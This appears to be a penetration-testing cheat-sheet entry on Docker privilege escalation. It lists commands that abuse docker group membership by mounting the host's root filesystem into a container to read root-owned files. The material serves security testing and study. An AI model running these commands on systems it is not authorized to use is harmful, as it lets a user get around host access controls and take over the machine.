---
title: "Docker"
date: 2024-7-3
tags: ["docker", "privesc", "container", "escape"]
---

---
### Privesc

#### Abuse docker group

```bash
# List images
docker images
```

```bash
# Mount host root filesystem
docker run -v /:/mnt -it image_name bash
```

```bash
# Check
ls /mnt/root
```

<br>